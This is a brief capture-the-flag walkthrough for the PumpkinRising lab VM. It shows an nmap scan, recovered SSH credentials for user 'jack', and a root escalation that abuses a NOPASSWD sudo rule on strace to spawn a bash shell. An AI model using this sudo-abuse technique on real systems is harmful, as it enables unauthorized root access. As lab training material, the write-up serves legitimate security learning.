PumpkinRising


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[+]  Embeded password in GPG
[+] Privilege Escalation abusing SUDO rights -  strace
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Scan Results

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-24 23:28 EDT
Nmap scan report for 192.168.56.101
Host is up (0.00054s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 1a:de:2a:25:2c:cc:51:4b:7a:a0:e0:73:23:b9:3a:64 (DSA)
|   2048 f4:67:d3:d3:e5:24:c0:fc:c4:60:07:1c:1a:34:e9:54 (RSA)
|   256 10:ce:a1:ee:54:27:03:2d:a0:b1:dc:75:80:f2:db:8b (ECDSA)
|_  256 6c:9d:b1:8d:ab:1f:3a:7c:e9:ad:bd:db:d8:81:d7:87 (ED25519)
80/tcp open  http    Apache httpd
| http-robots.txt: 23 disallowed entries (15 shown)
| /includes/ /scripts/ /js/ /secrets/ /css/ /themes/ 
| /CHANGELOG.txt /underconstruction.html /info.php /hidden/note.txt 
| /INSTALL.mysql.txt /seeds/seed.txt.gpg /js/hidden.js /comment/reply/ 
|_/filter/tips/
|_http-server-header: Apache
|_http-title: Mission-Pumpkin
MAC Address: 08:00:27:DA:0B:C6 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



username :  jack
Password : 69507506099645486568

Privilege Escalation

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# ssh jack@192.168.56.101
jack@192.168.56.101's password: 
------------------------------------------------------------------------------
                          Welcome to Mission-Pumpkin
      All remote connections to this machine are monitored and recorded
------------------------------------------------------------------------------
Last login: Tue Jun 18 21:04:28 2019 from 192.168.1.105
jack@Pumpkin:~$ sudo -l
Matching Defaults entries for jack on Pumpkin:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jack may run the following commands on Pumpkin:
    (ALL) NOPASSWD: /usr/bin/strace
jack@Pumpkin:~$ 
jack@Pumpkin:~$ sudo /usr/bin/strace -o /dev/null /bin/bash
root@Pumpkin:~# id
uid=0(root) gid=0(root) groups=0(root)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
